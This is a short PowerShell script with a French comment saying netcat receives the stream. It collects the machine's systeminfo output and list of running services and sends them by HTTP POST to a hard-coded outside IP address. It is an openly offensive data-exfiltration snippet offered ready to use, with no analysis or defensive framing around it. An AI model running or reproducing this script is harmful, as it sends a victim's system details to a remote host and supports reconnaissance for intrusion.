
#Attention utilisation de netcat pour recuperer le flux -- Script Powershell retrocompatbile (v2/3/4/5/6)

$infos = systeminfo;$task = Get-Service;$infos = $infos | Out-String;$task = $task | Out-String;

$Body = [byte[]][char[]]$infos;
$Request = [System.Net.HttpWebRequest]::Create('http://178.170.58.9/post.php');
$Request.Method = 'POST';
$Stream = $Request.GetRequestStream();
$Stream.Write($Body, 0, $Body.Length);
$Request.GetResponse();
$Stream.Close();
